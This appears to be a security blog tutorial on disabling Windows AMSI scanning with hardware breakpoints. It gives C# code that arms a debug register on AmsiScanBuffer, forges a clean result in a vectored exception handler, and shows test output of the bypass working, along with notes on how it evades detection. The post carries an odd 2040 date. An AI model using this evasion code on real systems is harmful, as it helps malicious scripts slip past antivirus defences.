---
title: "AMSI Bypass Part 2: Hardware Breakpoints"
date: 2040-05-15 00:00:00 +0000
categories: [AV/EDR Bypass, AMSI]
tags: [amsi, bypass, hardware-breakpoints, csharp, veh, setthreadcontext, dotnet, windows]
toc: true
---

## Overview

[Part 1](/posts/amsi-internals-scan-pipeline/) established the scan pipeline and identified the target: the result pointer passed as the sixth argument to `AmsiScanBuffer`. Writing `1` (`AMSI_RESULT_NOT_DETECTED`) to that address before the provider runs bypasses the scan without touching `amsi.dll`.

The question is how to intercept execution at `AmsiScanBuffer`'s first instruction without patching it. Patching requires `VirtualProtect` — making a loaded module's memory writable — which is a high-signal event. Hardware breakpoints do not touch memory at all. The processor's own debug registers trigger an exception when execution reaches a watched address, and a Vectored Exception Handler catches it.

**What this post covers:**
- How the x86-64 debug registers work (`DR0`–`DR3`, `DR7`)
- Setting a hardware breakpoint from C# using `SetThreadContext`
- A VEH that intercepts `AmsiScanBuffer` at entry, writes the result, and returns cleanly
- Proof of the bypass against Windows Defender's AMSI provider
- Detection surface compared to patching-based approaches

> All techniques described here were performed in an authorised lab environment. For educational purposes only.

---

## How Hardware Breakpoints Work

The x86-64 architecture has four hardware breakpoint registers: `DR0` through `DR3`. Each holds an address. `DR7` controls whether each is active and what condition triggers it — execute, read, or write.

### Debug Register Layout

`DR0`–`DR3` are straightforward: each stores a single linear address. Setting `DR0 = 0x00007FFF898F8160` (the address of `AmsiScanBuffer`) tells the processor to watch that location.

`DR7` is the control register. The bits that matter for an execution breakpoint on `DR0`:

| DR7 bits | Field | Value for execute breakpoint on DR0 |
|---|---|---|
| `0` | L0 — local enable for DR0 | `1` (enable) |
| `1` | G0 — global enable for DR0 | `0` (not needed) |
| `16–17` | R/W0 — condition for DR0 | `00` (break on execution) |
| `18–19` | LEN0 — operand size for DR0 | `00` (1-byte / execute) |

To arm an execution breakpoint on `DR0` only: `DR7 = 0x1`. Every other bit stays zero.

When the processor executes the instruction at `DR0`, it raises a `STATUS_SINGLE_STEP` (`0x80000004`) exception before that instruction runs. A Vectored Exception Handler registered with `AddVectoredExceptionHandler` receives control with the full thread `CONTEXT` available.

### Why This Avoids Detection

The classic bypass path — `VirtualProtect` → patch bytes → restore — leaves multiple signals:

- `VirtualProtect` called on a page belonging to a loaded module (`amsi.dll`)
- `WriteProcessMemory` or `Marshal::Copy` to that address range
- The page's protection temporarily changing to `RWX`

Hardware breakpoints use none of these. The only operation that touches any system state beyond your own thread is a `SetThreadContext` call with `DR0` and `DR7` populated. The address you are watching is never written to.

---

## Implementation

The bypass is a single static class — `AmsiBypass.Enable()` is the only public method. It performs three operations in sequence: locate the target, register the handler, arm the debug register.

### 1. Locating AmsiScanBuffer

```csharp
IntPtr amsi = GetModuleHandle("amsi.dll");
s_amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
```

`amsi.dll` is already loaded in any AMSI-aware host process — `AmsiInitialize` loads it. `GetModuleHandle` does not increment the reference count and does not load anything. `GetProcAddress` returns the address of the function's first byte, which is what goes into `DR0`.

### 2. Registering the VEH

```csharp
s_veh = VehCallback;    // hold delegate reference — prevents GC collection
IntPtr veh = AddVectoredExceptionHandler(1, s_veh);
```

Passing `1` as the first argument puts this handler at the **head** of the VEH chain — it runs before any other registered handler. The delegate reference is stored in a static field; if it were a local variable the garbage collector would collect it while the handler is still registered, resulting in a crash on the next `AmsiScanBuffer` call.

### 3. Arming DR0 with SetThreadContext

The `CONTEXT` structure on x64 is 1,232 bytes and requires 16-byte alignment. `HeapAlloc` (used internally by `Marshal.AllocHGlobal`) satisfies this on x64.

```csharp
IntPtr ctx = Marshal.AllocHGlobal(1232);

// zero the buffer, then set ContextFlags
Marshal.WriteInt32(ctx, 0x30, (int)CONTEXT_DEBUG_REGISTERS);

GetThreadContext(GetCurrentThread(), ctx);

// write DR0 = AmsiScanBuffer address, DR7 = L0 enable bit
Marshal.WriteInt64(ctx, 0x48, address.ToInt64());   // DR0
Marshal.WriteInt64(ctx, 0x70, 0x1);                  // DR7

SetThreadContext(GetCurrentThread(), ctx);
```

The `CONTEXT_DEBUG_REGISTERS` flag (`0x00100010`) tells `GetThreadContext` and `SetThreadContext` to read and write only the debug register fields. Calling `GetThreadContext` first preserves any existing state before writing `DR0` and `DR7`.

The key offsets in the x64 `CONTEXT` structure:

| Field | Offset |
|---|---|
| `ContextFlags` | `0x30` |
| `Dr0` | `0x48` |
| `Dr7` | `0x70` |
| `Rax` | `0x78` |
| `Rsp` | `0x98` |
| `Rip` | `0xF8` |

### 4. The VEH Handler

When execution hits `AmsiScanBuffer`, the processor raises `STATUS_SINGLE_STEP`. The VEH receives an `EXCEPTION_POINTERS` structure containing two pointers: `ExceptionRecord` and `ContextRecord`.

```csharp
static int VehCallback(IntPtr exceptionInfo)
{
    IntPtr exRecPtr = Marshal.ReadIntPtr(exceptionInfo, 0);
    IntPtr ctxPtr   = Marshal.ReadIntPtr(exceptionInfo, IntPtr.Size);

    uint code   = (uint)Marshal.ReadInt32(exRecPtr, 0x00);  // ExceptionCode
    IntPtr addr = Marshal.ReadIntPtr(exRecPtr, 0x10);       // ExceptionAddress

    if (code != STATUS_SINGLE_STEP || addr != s_amsiScanBuffer)
        return EXCEPTION_CONTINUE_SEARCH;
    ...
```

Two filters: the exception code must be `STATUS_SINGLE_STEP`, and the address must be exactly `AmsiScanBuffer`. Any other single-step exception — from a debugger or another breakpoint — falls through with `EXCEPTION_CONTINUE_SEARCH`.

#### Reading the Result Pointer

At `AmsiScanBuffer`'s entry point, the stack layout follows the x64 calling convention. The sixth argument (`AMSI_RESULT *result`) lives at `[RSP+0x30]`:

```
[RSP+0x00]  return address
[RSP+0x08]  home space  (arg1: amsiContext)
[RSP+0x10]  home space  (arg2: buffer)
[RSP+0x18]  home space  (arg3: length)
[RSP+0x20]  home space  (arg4: contentName)
[RSP+0x28]  arg5: amsiSession
[RSP+0x30]  arg6: AMSI_RESULT *result   ←
```

The home space (shadow space) is 32 bytes reserved by the caller for the first four register arguments. Arguments five and six sit above it on the caller's stack frame.

```csharp
    long rsp = Marshal.ReadInt64(ctxPtr, 0x98);              // Context.Rsp

    IntPtr resultPtrAddr = new IntPtr(rsp + 0x30);           // address of the result pointer
    IntPtr resultPtr     = Marshal.ReadIntPtr(resultPtrAddr); // dereference it
    Marshal.WriteInt32(resultPtr, AMSI_RESULT_NOT_DETECTED);  // write 1
```

#### Simulating ret

The VEH fires before `AmsiScanBuffer` executes even its first instruction. Rather than continue into the function, we skip it entirely by simulating a `ret`:

```csharp
    long retAddr = Marshal.ReadInt64(new IntPtr(rsp));  // [RSP] = return address
    Marshal.WriteInt64(ctxPtr, 0xF8, retAddr);           // RIP = return address
    Marshal.WriteInt64(ctxPtr, 0x98, rsp + 8);           // RSP += 8 (pop return address)
    Marshal.WriteInt64(ctxPtr, 0x78, 0);                 // RAX = 0 (S_OK / HRESULT success)

    return EXCEPTION_CONTINUE_EXECUTION;
```

`EXCEPTION_CONTINUE_EXECUTION` tells the kernel to resume execution using the modified `CONTEXT` — which now points `RIP` at the caller's next instruction, as if `AmsiScanBuffer` returned `S_OK` normally.

`RAX = 0` is intentional. `AmsiScanBuffer` returns an `HRESULT`. The scan verdict is in the result pointer (which we already wrote). The caller checks `SUCCEEDED(hr)` on the return value, so we return `0` (`S_OK`) to prevent it from taking an error path.

The breakpoint stays armed. `DR0` and `DR7` remain set — the next `AmsiScanBuffer` call is intercepted automatically.

---

## Proof

The test harness calls the AMSI API directly — `AmsiInitialize`, `AmsiOpenSession`, `AmsiScanBuffer` — without going through PowerShell. It scans two strings before the bypass and the same strings after, printing the result value each time along with a VEH hit counter.

The AMSI test string (`AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386`) is the canonical test input: compliant AMSI providers are required to flag it, making it equivalent to EICAR for the AMSI layer. It confirms that `MpOav.dll` is loaded and active before the bypass runs.

```
AMSI Hardware Breakpoint Bypass — Test
---------------------------------------------
[*] AMSI initialised

[ BEFORE bypass ]
  scan("test")                                                    -> clean (1)
  scan("AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386") -> DETECTED (32768+)
  VEH hits so far: 0

[ Enabling bypass ]
[*] AmsiScanBuffer  @ 0x00007FFF898F8160
[*] VEH registered
[+] DR0 armed — hardware breakpoint active

[ AFTER bypass ]
  scan("test")                                                    -> clean (1)
  scan("AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386") -> clean (1)
  scan("AmsiScanBuffer")                                          -> clean (1)
  VEH hits so far: 3
```

![Test harness output: AMSI test string goes from DETECTED to clean after Enable(), VEH hit counter confirms 3 interceptions](/assets/img/posts/amsi-internals/proof-output.png)

Before the bypass: `AMSI Test Sample` is flagged as `32768` (`AMSI_RESULT_DETECTED`) and the VEH has not fired. After `Enable()`: the same string returns `1`, and the counter shows the handler intercepted all three subsequent scans — including a scan of the string `"AmsiScanBuffer"` itself. No byte of `amsi.dll` was modified at any point.

---

## Detection Notes

| Technique | Writes to amsi.dll | VirtualProtect | Primary detection signal |
|---|---|---|---|
| `amsiContext` / `amsiInitFailed` | No (managed memory) | No | Static string + reflection behavioral rule |
| `AmsiScanBuffer` / `AmsiOpenSession` patch | **Yes** | **Yes** | `VirtualProtect` on module page |
| Hardware breakpoints | **No** | **No** | `SetThreadContext` with non-zero DR registers |

The hardware breakpoint approach has a narrow detection surface. `SetThreadContext` is a standard API — called constantly by debuggers and profilers — and does not itself generate a rule trigger. What distinguishes malicious use is the combination of non-zero `DR0` and an enabled `DR7` targeting a security-relevant address.

MDE collects thread context data through kernel callbacks and ETW, but hardware breakpoint state is not a default high-confidence alert. The absence of `VirtualProtect`, `WriteProcessMemory`, or any modification to `amsi.dll`'s text section removes the most reliable signals. Detection shifts to behavioural correlation — a process that registers a VEH, calls `SetThreadContext` with debug registers set, and subsequently handles `STATUS_SINGLE_STEP` exceptions at AMSI entry points — which requires higher-fidelity instrumentation than most environments run.

---

## References

- [AddVectoredExceptionHandler — MSDN](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler)
- [SetThreadContext — MSDN](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
- [CONTEXT structure (x64) — MSDN](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)
- [x64 calling convention — MSDN](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention)
- [AMSI Test Sample — Microsoft](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)
- [MITRE ATT&CK T1562.001 — Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

**Related posts:**
- [AMSI Internals Part 1: The Full Scan Pipeline](/posts/amsi-internals-scan-pipeline/)
